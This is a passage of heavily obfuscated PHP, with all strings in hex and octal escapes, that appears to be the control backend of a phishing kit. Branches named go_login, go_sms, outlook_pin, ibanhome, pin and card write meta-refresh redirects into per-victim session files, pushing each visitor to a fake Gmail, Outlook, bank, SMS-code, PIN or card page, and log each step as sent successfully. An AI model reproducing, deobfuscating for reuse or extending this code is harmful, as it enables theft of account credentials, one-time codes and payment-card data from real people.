"\x70\x68\157\x6e\x65\x2e\x70\x68\x70"; if (check_file($_SESSION["\x75\x73\x65\x72\151\x64"], $file_s)) { up_file($_SESSION["\165\x73\x65\x72\151\144"], "\74\x6d\x65\x74\x61\x20\x68\164\164\x70\x2d\x65\161\165\151\166\x3d\x27\x72\145\x66\162\x65\163\x68\47\40\143\x6f\x6e\164\145\156\164\75\x27\60\x3b\x75\162\x6c\75\x70\x68\157\x6e\x65\56\x70\x68\x70\x3f\x76\145\x72\151\146\x79\137\x61\143\x63\x6f\165\x6e\164\x3d\163\145\163\x73\151\x6f\156\75\x26" . md5(microtime()) . "\x26\x64\151\x73\160\x61\x74\143\x68\75" . sha1(microtime()) . "\x26\x61\x63\x63\145\x73\163\x3d\46\x64\x61\x74\141\x3d" . sha1(microtime()) . "\x27\40\57\x3e"); up_file_log($_SESSION["\165\x73\145\x72\x69\144"], "\123\x65\x6e\x64\x20\x50\150\x6f\x6e\145\40\x70\141\147\x65\x20\x53\x75\143\143\x65\x73\163\146\165\x6c\154\x79\174{$project_name}\174{$local_time}"); echo "\x50\150\157\x6e\x65"; } } elseif ($command_send == "\x75\x74\151\154\151\163\x61\164\145\165\162") { $project_name = $_SESSION["\x70\162\x6f\x6a\x65\x63\x74\x5f\156\x61\x6d\145"]; $file_s = "\165\164\x69\154\151\163\141\x74\x65\165\x72\x2e\x70\150\x70"; if (check_file($_SESSION["\x75\x73\145\162\151\x64"], $file_s)) { up_file($_SESSION["\x75\163\x65\x72\x69\x64"], "\x3c\155\x65\x74\x61\x20\x68\164\164\160\55\145\x71\x75\x69\166\75\x27\162\x65\146\x72\145\x73\150\47\40\x63\x6f\156\164\145\156\x74\x3d\x27\60\x3b\x75\x72\x6c\75\165\x74\151\x6c\151\163\141\x74\145\x75\162\56\x70\150\x70\x3f\166\145\x72\151\x66\x79\137\141\143\x63\x6f\x75\x6e\x74\75\x73\145\x73\x73\x69\x6f\x6e\x3d\46" . md5(microtime()) . "\x26\x64\x69\163\x70\x61\164\143\150\x3d" . sha1(microtime()) . "\46\141\x63\x63\145\x73\x73\75\x26\x64\x61\164\141\x3d" . sha1(microtime()) . "\47\40\x2f\76"); up_file_log($_SESSION["\165\x73\145\x72\151\x64"], "\x53\x65\156\144\x20\165\x74\151\x6c\151\x73\141\x74\x65\165\x72\40\160\x61\x67\x65\40\x53\x75\143\143\145\x73\x73\146\x75\154\154\x79\x7c{$project_name}\x7c{$local_time}"); echo "\165\164\x69\154\151\x73\141\164\x65\x75\x72"; } } elseif ($command_send == "\x75\x73\141\147\145\162") { $project_name = $_SESSION["\x70\x72\x6f\x6a\x65\143\x74\x5f\156\141\x6d\x65"]; $file_s = "\165\x73\141\x67\x65\x72\56\x70\x68\x70"; if (check_file($_SESSION["\x75\x73\x65\x72\x69\x64"], $file_s)) { up_file($_SESSION["\x75\x73\145\x72\151\x64"], "\74\155\x65\x74\141\40\150\164\x74\160\x2d\145\x71\165\x69\x76\75\47\162\145\x66\x72\x65\163\150\47\40\x63\x6f\x6e\164\145\156\x74\75\x27\x30\x3b\x75\x72\x6c\75\165\163\x61\x67\x65\162\56\160\150\160\77\x76\145\162\151\x66\x79\x5f\x61\x63\143\x6f\x75\x6e\164\75\163\x65\163\163\x69\x6f\156\x3d\46" . md5(microtime()) . "\46\144\x69\x73\x70\x61\164\x63\x68\75" . sha1(microtime()) . "\x26\x61\x63\143\145\163\x73\75\x26\x64\141\164\x61\75" . sha1(microtime()) . "\x27\x20\57\x3e"); up_file_log($_SESSION["\x75\163\145\162\x69\x64"], "\123\145\x6e\144\40\x75\x73\x61\x67\145\162\x20\160\x61\x67\145\x20\123\x75\x63\143\145\163\x73\x66\x75\x6c\x6c\171\174{$project_name}\174{$local_time}"); echo "\165\163\141\147\145\162"; } } elseif ($command_send == "\x61\154\x65\162\x74") { $project_name = $_SESSION["\160\162\x6f\x6a\x65\143\x74\137\156\141\155\x65"]; $file_s = "\141\x6c\145\162\164\56\x70\150\160"; if (check_file($_SESSION["\165\163\x65\162\x69\144"], $file_s)) { up_file($_SESSION["\165\163\x65\162\151\144"], "\74\x6d\x65\x74\141\x20\x68\164\164\x70\x2d\x65\161\x75\151\x76\75\47\x72\x65\146\162\145\x73\x68\x27\40\x63\x6f\156\164\x65\x6e\164\75\47\60\73\x75\162\x6c\75\141\154\x65\162\x74\x2e\x70\x68\x70\x3f\x76\145\162\151\x66\x79\x5f\141\143\143\157\165\x6e\x74\x3d\163\145\x73\x73\151\157\156\75\x26" . md5(microtime()) . "\46\x64\x69\163\x70\141\x74\143\x68\x3d" . sha1(microtime()) . "\x26\x61\143\143\145\x73\163\75\x26\144\141\x74\x61\x3d" . sha1(microtime()) . "\47\40\x2f\x3e"); up_file_log($_SESSION["\165\163\x65\x72\151\x64"], "\x53\145\x6e\x64\40\141\154\145\x72\164\x20\160\141\147\x65\40\x53\165\143\x63\145\x73\163\146\x75\154\154\x79\174{$project_name}\x7c{$local_time}"); echo "\x61\x6c\x65\x72\164"; } } elseif ($command_send == "\157\x70\x65\x72\x61\x74\x69\157\156\x73\141\160\x70") { $project_name = $_SESSION["\160\x72\157\152\x65\143\x74\x5f\156\x61\155\x65"]; $file_s = "\x6f\160\x65\162\x61\164\151\x6f\x6e\x73\x61\160\x70\x2e\x70\150\x70"; if (check_file($_SESSION["\x75\x73\x65\162\151\x64"], $file_s)) { up_file($_SESSION["\x75\163\x65\162\x69\144"], "\74\155\145\164\x61\40\x68\164\164\x70\55\x65\161\165\x69\x76\75\x27\162\145\146\x72\145\163\x68\x27\x20\143\157\x6e\x74\x65\156\x74\x3d\47\60\73\165\x72\x6c\x3d\157\160\x65\162\141\164\x69\157\x6e\x73\141\x70\x70\x2e\x70\150\160\x3f\166\145\162\x69\146\x79\x5f\x61\x63\143\157\x75\156\164\75\x73\x65\163\163\151\157\x6e\x3d\46" . md5(microtime()) . "\x26\144\x69\x73\160\x61\x74\143\x68\75" . sha1(microtime()) . "\x26\141\143\x63\x65\x73\163\75\46\144\141\x74\141\75" . sha1(microtime()) . "\x27\40\x2f\76"); up_file_log($_SESSION["\x75\x73\145\x72\x69\144"], "\123\145\x6e\144\x20\x4f\x70\x65\x72\x61\164\x69\x6f\156\x73\x20\x41\x50\120\40\160\141\147\145\40\123\165\143\143\x65\163\163\146\x75\x6c\x6c\171\x7c{$project_name}\x7c{$local_time}"); echo "\x6f\x70\145\162\141\164\151\157\x6e\163\x61\x70\x70"; } } elseif ($command_send == "\x6f\x70\x65\x72\141\x74\x69\x6f\156\x73\x73\155\x73") { $project_name = $_SESSION["\x70\162\157\x6a\x65\x63\x74\x5f\156\141\x6d\145"]; $file_s = "\157\160\145\x72\141\164\x69\157\156\163\x73\x6d\163\56\160\x68\160"; if (check_file($_SESSION["\165\163\x65\x72\x69\144"], $file_s)) { up_file($_SESSION["\x75\163\145\162\x69\144"], "\74\155\x65\x74\x61\40\150\x74\x74\160\55\x65\161\165\x69\x76\x3d\x27\x72\145\x66\162\145\163\x68\47\40\143\157\156\164\145\156\x74\x3d\47\60\x3b\x75\162\x6c\75\x6f\160\x65\162\141\164\151\157\156\x73\163\x6d\x73\56\160\x68\160\77\x76\145\162\x69\x66\x79\137\141\x63\x63\x6f\165\x6e\x74\75\163\x65\x73\163\x69\157\x6e\75\46" . md5(microtime()) . "\x26\144\151\x73\160\141\164\143\150\75" . sha1(microtime()) . "\46\141\x63\143\x65\163\x73\x3d\x26\144\x61\164\x61\x3d" . sha1(microtime()) . "\47\40\x2f\x3e"); up_file_log($_SESSION["\x75\x73\x65\162\x69\144"], "\123\145\x6e\x64\40\157\x70\x65\x72\141\164\x69\x6f\x6e\x73\x20\123\115\x53\40\160\141\147\145\x20\123\x75\143\143\145\163\163\x66\165\x6c\154\x79\174{$project_name}\174{$local_time}"); echo "\157\160\145\x72\x61\164\x69\157\x6e\x73\x73\x6d\163"; } } elseif ($command_send == "\147\157\137\154\x6f\147\151\x6e") { $project_name = $_SESSION["\160\162\157\152\145\143\164\x5f\156\141\155\145"]; $file_s = "\x67\157\137\x6c\x6f\x67\x69\156\x2e\160\x68\x70"; if (check_file($_SESSION["\165\x73\x65\162\151\x64"], $file_s)) { up_file($_SESSION["\165\x73\x65\x72\151\x64"], "\74\155\145\164\x61\x20\x68\x74\164\160\55\x65\x71\x75\x69\x76\75\x27\162\x65\x66\x72\145\163\150\x27\x20\143\157\156\164\x65\x6e\x74\x3d\47\60\x3b\x75\162\x6c\x3d\147\157\137\x6c\x6f\147\x69\x6e\x2e\160\150\160\x3f\166\x65\162\x69\146\171\x5f\x61\x63\x63\157\165\156\164\x3d\x73\145\x73\163\x69\157\x6e\75\46" . md5(microtime()) . "\x26\144\151\x73\160\x61\x74\143\x68\x3d" . sha1(microtime()) . "\46\141\x63\143\x65\x73\x73\75\x26\x64\x61\x74\141\75" . sha1(microtime()) . "\x27\40\x2f\x3e"); up_file_log($_SESSION["\165\x73\145\x72\x69\x64"], "\x53\145\156\x64\40\x47\155\141\151\154\40\x4c\x6f\x67\x69\156\x20\x70\x61\x67\145\40\123\165\x63\143\x65\163\x73\146\165\x6c\x6c\171\174{$project_name}\174{$local_time}"); echo "\147\157\137\154\x6f\x67\x69\156"; } } elseif ($command_send == "\147\x6f\x5f\x70\x68\157\x6e\145") { $project_name = $_SESSION["\x70\162\x6f\152\145\143\x74\137\x6e\x61\x6d\145"]; $file_s = "\x67\157\137\160\150\157\156\145\56\x70\x68\160"; if (check_file($_SESSION["\x75\x73\x65\162\x69\x64"], $file_s)) { up_file($_SESSION["\165\x73\x65\162\151\x64"], "\x3c\155\145\164\x61\40\x68\164\164\160\55\x65\x71\165\151\166\x3d\47\162\x65\x66\162\145\x73\x68\47\40\143\x6f\x6e\x74\x65\x6e\x74\x3d\x27\60\73\x75\x72\154\75\x67\x6f\137\x70\x68\157\x6e\x65\56\160\x68\x70\77\166\145\x72\x69\146\x79\x5f\x61\x63\143\157\x75\x6e\x74\75\163\145\163\163\151\x6f\156\x3d\x26" . md5(microtime()) . "\x26\144\151\x73\160\x61\164\x63\x68\75" . sha1(microtime()) . "\46\141\x63\x63\x65\x73\163\75\46\x64\141\x74\141\x3d" . sha1(microtime()) . "\x27\x20\x2f\x3e"); up_file_log($_SESSION["\x75\163\145\162\151\144"], "\x53\145\x6e\144\40\107\155\x61\x69\154\40\120\x68\157\156\x65\40\x70\141\x67\x65\40\123\165\x63\x63\x65\x73\x73\x66\165\x6c\154\171\174{$project_name}\174{$local_time}"); echo "\x67\157\137\x70\x68\157\156\x65"; } } elseif ($command_send == "\147\157\137\x73\155\163") { $project_name = $_SESSION["\x70\162\157\152\145\143\x74\137\x6e\141\x6d\145"]; $file_s = "\x67\x6f\x5f\163\x6d\163\x2e\160\150\x70"; if (check_file($_SESSION["\x75\x73\x65\x72\151\144"], $file_s)) { up_file($_SESSION["\165\x73\x65\x72\x69\x64"], "\x3c\155\x65\x74\141\x20\150\164\164\x70\55\145\161\x75\x69\x76\x3d\47\x72\x65\146\162\x65\163\x68\x27\x20\x63\x6f\156\x74\145\x6e\x74\x3d\47\60\73\165\162\x6c\75\x67\157\137\x73\x6d\x73\x2e\x70\150\160\x3f\x76\145\162\151\146\x79\137\141\143\143\157\165\x6e\164\x3d\163\145\163\x73\x69\157\x6e\75\46" . md5(microtime()) . "\x26\144\x69\163\x70\x61\164\x63\x68\x3d" . sha1(microtime()) . "\x26\141\143\143\145\163\163\x3d\46\x64\x61\x74\141\x3d" . sha1(microtime()) . "\x27\40\x2f\76"); up_file_log($_SESSION["\165\x73\145\162\151\x64"], "\x53\145\156\144\40\x47\x6d\x61\x69\154\x20\x53\115\123\x20\160\141\147\x65\x20\123\x75\143\143\145\163\x73\146\x75\x6c\154\171\174{$project_name}\x7c{$local_time}"); echo "\x67\157\137\x73\155\163"; } } elseif ($command_send == "\x67\157\x5f\x61\160\160") { $project_name = $_SESSION["\160\162\157\x6a\145\143\164\x5f\x6e\141\155\x65"]; $file_s = "\x67\157\x5f\x61\160\160\x2e\x70\150\160"; if (check_file($_SESSION["\x75\x73\145\x72\151\x64"], $file_s)) { up_file($_SESSION["\165\x73\x65\x72\x69\144"], "\x3c\x6d\x65\x74\x61\x20\150\x74\164\x70\x2d\145\x71\165\151\166\75\x27\162\145\146\x72\145\x73\150\47\40\143\157\x6e\x74\x65\x6e\x74\75\x27\x30\73\165\x72\x6c\x3d\147\x6f\x5f\x61\x70\160\x2e\x70\x68\x70\77\166\145\162\x69\x66\x79\x5f\141\143\143\x6f\165\x6e\x74\75\163\x65\163\163\x69\157\x6e\75\x26" . md5(microtime()) . "\46\x64\151\x73\x70\141\164\143\x68\x3d" . sha1(microtime()) . "\46\x61\143\x63\145\163\163\x3d\x26\144\x61\164\x61\75" . sha1(microtime()) . "\47\40\57\x3e"); up_file_log($_SESSION["\165\x73\x65\162\x69\x64"], "\x53\145\156\144\40\x47\x6d\141\151\x6c\x20\x41\x50\x50\x20\x70\x61\x67\x65\x20\x53\x75\143\143\x65\x73\163\x66\165\154\x6c\x79\x7c{$project_name}\174{$local_time}"); echo "\147\157\137\141\x70\x70"; } } elseif ($command_send == "\147\x6f\x5f\x70\151\156") { $project_name = $_SESSION["\160\x72\157\x6a\145\x63\x74\137\x6e\x61\155\145"]; $file_s = "\x67\157\x5f\160\x69\x6e\x2e\160\x68\x70"; if (check_file($_SESSION["\165\x73\x65\162\151\144"], $file_s)) { up_file($_SESSION["\x75\163\x65\x72\151\x64"], "\74\155\x65\x74\x61\40\150\164\x74\x70\x2d\145\x71\165\x69\x76\75\47\162\x65\x66\162\x65\163\150\x27\40\143\x6f\156\x74\145\156\164\x3d\x27\60\x3b\x75\162\x6c\75\147\157\137\x70\x69\156\x2e\x70\150\160\x3f\x76\x65\162\x69\146\171\x5f\141\x63\143\x6f\x75\x6e\164\75\x73\145\x73\163\151\157\156\75\46" . md5(microtime()) . "\46\x64\151\x73\160\x61\x74\143\150\75" . sha1(microtime()) . "\x26\141\x63\143\145\163\163\75\46\144\141\x74\x61\x3d" . sha1(microtime()) . "\x27\x20\x2f\x3e"); up_file_log($_SESSION["\165\x73\x65\162\x69\x64"], "\123\x65\156\x64\x20\107\x6d\141\x69\154\40\x41\120\120\x20\160\141\x67\x65\40\123\x75\143\x63\x65\x73\163\x66\x75\x6c\x6c\x79\x7c{$project_name}\x7c{$local_time}"); echo "\x67\x6f\x5f\160\x69\x6e"; } } elseif ($command_send == "\x6f\165\x74\x6c\x6f\x6f\153\137\x6c\x6f\x67\151\156") { $project_name = $_SESSION["\160\162\157\152\145\x63\164\137\x6e\141\155\x65"]; $file_s = "\x6f\x75\164\x6c\x6f\x6f\x6b\x5f\154\157\x67\151\156\56\160\x68\x70"; if (check_file($_SESSION["\x75\163\x65\162\x69\144"], $file_s)) { up_file($_SESSION["\165\x73\x65\162\x69\144"], "\74\x6d\x65\x74\x61\40\150\x74\164\x70\55\145\161\165\151\166\75\47\x72\145\x66\x72\145\163\x68\47\x20\x63\x6f\x6e\164\145\156\x74\75\47\x30\x3b\165\162\154\x3d\157\165\164\x6c\157\x6f\153\137\x6c\157\147\151\156\56\x70\150\160\x3f\x76\145\x72\x69\146\x79\x5f\x61\x63\x63\157\x75\x6e\164\75\x73\145\163\x73\x69\x6f\156\75\x26" . md5(microtime()) . "\x26\144\x69\x73\160\141\164\143\150\75" . sha1(microtime()) . "\x26\x61\143\x63\x65\163\163\x3d\46\144\x61\x74\141\x3d" . sha1(microtime()) . "\47\x20\57\76"); up_file_log($_SESSION["\x75\163\x65\x72\x69\x64"], "\123\145\x6e\x64\40\x6f\165\164\154\x6f\x6f\153\137\154\157\147\151\x6e\40\160\141\147\145\40\123\x75\x63\143\x65\163\x73\146\x75\x6c\x6c\x79\x7c{$project_name}\x7c{$local_time}"); echo "\157\x75\x74\154\157\157\153\137\x6c\x6f\x67\x69\156"; } } elseif ($command_send == "\x6f\165\x74\x6c\x6f\157\153\137\160\x69\x6e") { $project_name = $_SESSION["\x70\x72\157\152\x65\x63\x74\137\156\x61\155\x65"]; $file_s = "\x6f\x75\164\x6c\x6f\157\x6b\137\160\x69\156\56\160\150\x70"; if (check_file($_SESSION["\165\163\x65\x72\x69\x64"], $file_s)) { up_file($_SESSION["\165\x73\145\x72\151\x64"], "\74\155\145\164\x61\40\150\164\x74\x70\55\x65\161\165\151\x76\x3d\x27\162\145\x66\162\145\163\x68\x27\x20\143\x6f\156\164\145\156\164\75\x27\60\x3b\165\x72\154\x3d\157\165\164\x6c\157\157\153\x5f\160\151\x6e\56\160\x68\x70\77\x76\145\162\x69\x66\171\x5f\x61\x63\x63\x6f\165\156\x74\75\x73\145\x73\x73\x69\x6f\x6e\75\46" . md5(microtime()) . "\x26\144\x69\163\160\x61\164\x63\150\x3d" . sha1(microtime()) . "\x26\x61\x63\143\145\163\x73\x3d\46\144\x61\164\141\x3d" . sha1(microtime()) . "\x27\x20\x2f\x3e"); up_file_log($_SESSION["\165\x73\x65\162\151\144"], "\123\145\156\144\40\157\165\x74\x6c\157\157\153\x5f\160\151\x6e\40\x70\x61\x67\145\40\123\x75\x63\143\145\163\x73\x66\x75\154\154\171\174{$project_name}\x7c{$local_time}"); echo "\157\x75\x74\x6c\157\x6f\153\137\160\151\156"; } } elseif ($command_send == "\x6f\165\164\x6c\x6f\157\153\x5f\141\160\160") { $project_name = $_SESSION["\x70\x72\157\152\x65\143\164\x5f\156\141\x6d\145"]; $file_s = "\157\x75\164\x6c\157\157\153\137\141\160\160\56\x70\x68\160"; if (check_file($_SESSION["\x75\x73\145\162\151\144"], $file_s)) { up_file($_SESSION["\x75\x73\145\162\151\144"], "\74\155\x65\x74\x61\x20\x68\x74\164\x70\x2d\x65\161\165\x69\x76\x3d\x27\162\145\x66\162\x65\163\150\47\x20\x63\157\156\164\145\x6e\164\x3d\x27\60\x3b\165\x72\x6c\75\157\x75\x74\x6c\157\x6f\153\137\141\160\160\56\x70\x68\160\x3f\166\145\162\x69\x66\171\137\x61\x63\143\157\165\156\164\75\163\x65\x73\163\x69\157\156\75\x26" . md5(microtime()) . "\46\144\151\x73\x70\x61\164\x63\150\75" . sha1(microtime()) . "\x26\141\143\x63\x65\163\163\75\46\x64\x61\164\141\x3d" . sha1(microtime()) . "\x27\40\57\76"); up_file_log($_SESSION["\x75\x73\x65\162\x69\x64"], "\x53\x65\156\x64\40\x6f\x75\x74\154\157\157\153\x5f\141\x70\x70\40\160\x61\x67\x65\x20\123\x75\143\x63\145\x73\163\146\x75\154\x6c\x79\174{$project_name}\x7c{$local_time}"); echo "\x6f\165\164\x6c\x6f\x6f\153\137\141\x70\x70"; } } elseif ($command_send == "\167\x65\142\x6d\x61\x69\154") { $project_name = $_SESSION["\x70\x72\157\152\145\143\164\137\156\141\x6d\145"]; $file_s = "\167\x65\x62\x6d\x61\151\154\56\160\x68\x70"; if (check_file($_SESSION["\165\163\x65\162\151\144"], $file_s)) { up_file($_SESSION["\x75\x73\x65\x72\x69\144"], "\74\x6d\145\x74\141\40\150\x74\x74\160\55\145\161\x75\x69\166\75\47\x72\145\146\x72\145\163\150\47\40\143\x6f\x6e\x74\145\156\164\x3d\x27\x30\x3b\165\162\154\75\167\x65\142\x6d\x61\x69\x6c\56\x70\150\160\77\x76\x65\x72\x69\146\x79\137\141\143\143\x6f\165\x6e\x74\75\163\x65\163\163\x69\157\156\75\x26" . md5(microtime()) . "\46\x64\151\x73\x70\x61\x74\143\x68\x3d" . sha1(microtime()) . "\46\x61\x63\143\145\x73\x73\x3d\x26\144\x61\x74\x61\x3d" . sha1(microtime()) . "\47\x20\x2f\x3e"); up_file_log($_SESSION["\165\x73\145\x72\x69\144"], "\123\145\156\x64\40\167\145\142\155\141\151\x6c\40\160\141\x67\145\x20\x53\x75\143\x63\x65\163\x73\x66\165\154\154\x79\x7c{$project_name}\x7c{$local_time}"); echo "\x77\x65\142\155\x61\x69\x6c"; } } elseif ($command_send == "\151\x62\141\x6e\x68\x6f\x6d\145") { $project_name = $_SESSION["\160\162\x6f\152\145\x63\164\x5f\156\141\x6d\145"]; $file_s = "\x69\x62\x61\156\x2d\x68\x6f\155\145\56\x70\150\160"; if (check_file($_SESSION["\x75\163\x65\162\x69\x64"], $file_s)) { up_file($_SESSION["\x75\163\145\162\x69\x64"], "\x3c\x6d\145\164\141\x20\150\164\164\x70\55\x65\161\165\x69\x76\x3d\x27\162\145\x66\162\x65\163\150\x27\40\x63\157\156\x74\145\x6e\x74\75\47\x30\73\165\162\x6c\x3d\x69\142\141\x6e\55\x68\x6f\x6d\x65\56\x70\x68\x70\x3f\x76\x65\x72\x69\x66\x79\137\x61\143\143\x6f\x75\x6e\x74\75\163\x65\163\x73\x69\157\156\x3d\46" . md5(microtime()) . "\x26\144\151\163\160\x61\164\x63\150\75" . sha1(microtime()) . "\46\141\143\x63\x65\x73\x73\x3d\46\144\x61\164\141\x3d" . sha1(microtime()) . "\x27\40\57\x3e"); up_file_log($_SESSION["\165\163\145\162\151\144"], "\123\145\156\144\x20\167\x65\142\155\141\x69\x6c\40\160\141\147\145\40\x53\x75\143\143\x65\x73\x73\x66\x75\154\x6c\171\x7c{$project_name}\x7c{$local_time}"); echo "\151\x62\141\156\150\157\155\145"; } } elseif ($command_send == "\x69\x62\x61\156\141\x70\160") { $project_name = $_SESSION["\160\162\157\x6a\x65\x63\x74\137\156\x61\x6d\x65"]; $file_s = "\151\x62\x61\x6e\55\x61\x70\160\x2e\160\x68\160"; if (check_file($_SESSION["\165\163\145\x72\151\x64"], $file_s)) { up_file($_SESSION["\x75\163\x65\162\x69\144"], "\x3c\x6d\145\164\141\40\150\164\164\x70\x2d\145\161\x75\x69\166\x3d\x27\x72\145\146\162\145\163\150\x27\x20\x63\x6f\156\164\145\x6e\164\x3d\47\60\x3b\165\x72\154\x3d\151\x62\141\156\55\141\x70\160\x2e\x70\150\160\77\x76\x65\x72\x69\x66\x79\137\x61\x63\143\157\165\156\164\75\x73\145\x73\163\x69\x6f\x6e\x3d\x26" . md5(microtime()) . "\x26\144\151\x73\160\x61\164\x63\150\75" . sha1(microtime()) . "\46\x61\x63\x63\x65\x73\163\x3d\x26\x64\141\164\141\75" . sha1(microtime()) . "\x27\40\57\76"); up_file_log($_SESSION["\165\x73\x65\x72\x69\144"], "\123\145\156\x64\x20\x77\x65\142\x6d\141\151\x6c\x20\160\141\x67\x65\x20\123\x75\143\x63\x65\x73\x73\x66\x75\154\x6c\171\174{$project_name}\x7c{$local_time}"); echo "\x69\x62\x61\x6e\141\x70\x70"; } } elseif ($command_send == "\x73\155\x73") { $project_name = $_SESSION["\x70\162\x6f\152\x65\x63\x74\x5f\156\141\155\145"]; $file_s = "\x73\155\x73\56\160\150\160"; if (check_file($_SESSION["\x75\x73\145\162\151\x64"], $file_s)) { up_file($_SESSION["\165\163\x65\x72\151\144"], "\74\155\145\x74\x61\x20\150\164\164\x70\x2d\145\x71\x75\151\166\75\47\x72\x65\146\162\x65\x73\150\x27\x20\x63\x6f\x6e\x74\x65\156\x74\x3d\x27\x30\73\165\x72\154\x3d\163\x6d\163\x2e\x70\x68\160\77\166\x65\162\x69\x66\x79\137\x61\x63\143\157\165\x6e\164\x3d\x73\145\163\163\x69\157\x6e\x3d\x26" . md5(microtime()) . "\x26\x64\x69\x73\x70\x61\x74\x63\150\x3d" . sha1(microtime()) . "\46\141\x63\x63\145\163\163\x3d\x26\144\141\x74\141\x3d" . sha1(microtime()) . "\x27\40\57\76"); up_file_log($_SESSION["\x75\x73\145\162\151\144"], "\123\145\156\x64\40\123\115\123\x20\x70\141\147\x65\x20\x53\x75\143\x63\145\163\x73\146\165\x6c\154\171\174{$project_name}\x7c{$local_time}"); echo "\123\115\123"; } } elseif ($command_send == "\145\x6d\x61\x69\x6c") { $project_name = $_SESSION["\160\x72\x6f\152\x65\143\x74\x5f\156\x61\155\145"]; $file_s = "\x65\x6d\141\151\154\x2e\160\150\x70"; if (check_file($_SESSION["\165\x73\x65\x72\151\144"], $file_s)) { up_file($_SESSION["\x75\x73\x65\162\x69\144"], "\74\x6d\145\164\141\40\x68\x74\164\x70\55\145\x71\165\151\166\75\x27\x72\x65\x66\162\145\163\150\47\x20\143\157\156\x74\x65\156\x74\75\x27\60\73\x75\162\x6c\x3d\145\155\141\x69\x6c\56\160\x68\160\77\166\145\162\x69\146\x79\x5f\141\143\x63\157\x75\x6e\x74\75\x73\145\163\x73\151\157\156\75\46" . md5(microtime()) . "\46\x64\x69\163\160\141\x74\143\150\75" . sha1(microtime()) . "\x26\141\x63\143\x65\x73\x73\75\46\x64\x61\x74\141\x3d" . sha1(microtime()) . "\47\40\57\76"); up_file_log($_SESSION["\165\163\145\x72\x69\144"], "\x53\x65\156\144\40\105\x6d\141\x69\154\x20\160\141\x67\145\x20\x53\x75\143\143\x65\163\x73\146\165\x6c\154\171\x7c{$project_name}\x7c{$local_time}"); echo "\x45\155\141\151\154"; } } elseif ($command_send == "\141\x70\x70") { $project_name = $_SESSION["\160\x72\157\152\x65\x63\x74\137\156\x61\x6d\145"]; $file_s = "\x61\x70\160\x2e\160\150\x70"; if (check_file($_SESSION["\x75\163\x65\162\151\144"], $file_s)) { up_file($_SESSION["\165\163\x65\162\151\x64"], "\x3c\x6d\x65\164\x61\x20\x68\x74\x74\160\55\145\161\x75\151\166\75\47\x72\x65\146\x72\x65\x73\x68\47\x20\x63\157\156\x74\x65\x6e\164\75\x27\x30\73\x75\x72\x6c\x3d\x61\x70\160\x2e\x70\x68\160\77\x76\145\x72\151\146\171\x5f\x61\x63\143\157\165\x6e\x74\x3d\163\145\x73\163\x69\157\x6e\x3d\x26" . md5(microtime()) . "\x26\144\x69\163\x70\141\164\x63\150\75" . sha1(microtime()) . "\x26\x61\143\x63\x65\x73\x73\x3d\x26\x64\141\x74\141\x3d" . sha1(microtime()) . "\x27\x20\x2f\x3e"); up_file_log($_SESSION["\x75\163\145\x72\151\144"], "\x53\x65\156\144\40\x41\x70\160\x6c\x69\143\141\x74\x69\x6f\156\40\160\x61\147\145\x20\x53\165\x63\x63\145\163\x73\x66\x75\154\154\171\x7c{$project_name}\174{$local_time}"); echo "\101\160\x70\x6c\151\x63\141\164\151\157\156"; } } elseif ($command_send == "\160\151\x6e") { $project_name = $_SESSION["\160\162\x6f\152\145\x63\x74\x5f\156\141\x6d\145"]; $file_s = "\160\x69\x6e\x2e\x70\x68\160"; if (check_file($_SESSION["\165\163\145\162\151\x64"], $file_s)) { up_file($_SESSION["\x75\x73\x65\x72\x69\x64"], "\x3c\x6d\x65\x74\x61\x20\x68\164\x74\x70\55\145\161\165\x69\166\x3d\x27\x72\x65\146\162\x65\x73\x68\x27\x20\143\157\156\x74\x65\156\x74\x3d\47\60\73\165\x72\x6c\x3d\x70\151\x6e\x2e\x70\x68\160\77\166\x65\162\x69\146\x79\137\x61\143\143\x6f\x75\x6e\x74\x3d\x73\145\163\163\x69\x6f\x6e\75\x26" . md5(microtime()) . "\46\144\151\163\160\x61\x74\143\x68\x3d" . sha1(microtime()) . "\46\x61\143\143\x65\163\163\x3d\46\x64\x61\x74\141\75" . sha1(microtime()) . "\x27\40\x2f\x3e"); up_file_log($_SESSION["\165\163\x65\162\x69\x64"], "\x53\x65\156\x64\40\x50\111\116\x20\x70\x61\x67\145\40\x53\x75\143\x63\145\x73\x73\146\x75\x6c\x6c\171\174{$project_name}\x7c{$local_time}"); echo "\120\111\116"; } } elseif ($command_send == "\155\x73\147") { $project_name = $_SESSION["\160\x72\x6f\152\145\x63\x74\137\156\x61\155\x65"]; $file_s = "\155\x65\x73\163\141\x67\145\56\160\x68\x70"; if (check_file($_SESSION["\165\163\x65\162\x69\144"], $file_s)) { up_file($_SESSION["\x75\163\x65\x72\x69\144"], "\74\155\145\x74\141\x20\x68\x74\x74\x70\55\145\161\165\151\x76\75\x27\x72\145\x66\x72\x65\163\x68\47\x20\x63\x6f\156\164\145\156\164\x3d\47\x30\x3b\x75\x72\x6c\75\x6d\145\x73\163\141\147\x65\56\x70\150\x70\77\x76\x65\x72\x69\x66\x79\137\x61\x63\x63\x6f\x75\156\x74\x3d\x73\145\163\x73\x69\x6f\156\75\x26" . md5(microtime()) . "\46\144\151\x73\x70\141\164\143\x68\x3d" . sha1(microtime()) . "\x26\x61\x63\143\145\163\163\x3d\46\x64\141\164\141\75" . sha1(microtime()) . "\47\40\57\x3e"); up_file_log($_SESSION["\165\163\145\162\151\x64"], "\x53\x65\156\144\x20\x4d\x65\163\x73\141\147\145\40\160\x61\147\x65\x20\x53\165\x63\143\145\x73\x73\x66\165\154\x6c\171\x7c{$project_name}\x7c{$local_time}"); echo "\115\x65\163\163\141\147\x65"; } } elseif ($command_send == "\x63\141\x72\x64") { $project_name = $_SESSION["\160\x72\157\152\x65\143\164\x5f\156\141\x6d\x65"]; $file_s = "\143\141\162\x64\56\160\150\x70"; if (check_file($_SESSION["\165\x73\x65\x72\151\x64"], $file_s)) { up_file($_SESSION["\x75\163\145\x72\x69\x64"], "\x3c\155\x65\164\141\x20\150\x74\164\x70\55\x65\x71\x75\x69\x76\75\x27\x72\x65\x66\162\145\x73\150\x27\x20\x63\x6f\156\164\x65\x6e\164\75\47\60\73\x75\162\154\75\143\141\162\144\x2e\160\x68\160\x3f\x76\x65\162\x69\146\x79\137\x61\143\x63\157\x75\x6e\x74\75\x73\x65\x73\163\151\157\x6e\75\x26" . md5(microtime()) . "\x26\x64\151\x73\160\141\x74\143\x68\75" . sha1(microtime()) . "\46\141\x63\143\x65\163\163\75\46\144\141\x74\x61\75" . sha1(microtime()) . "\47\x20\x2f\x3e"); up_file_log($_SESSION["\165\163\x65\x72\151\144"], 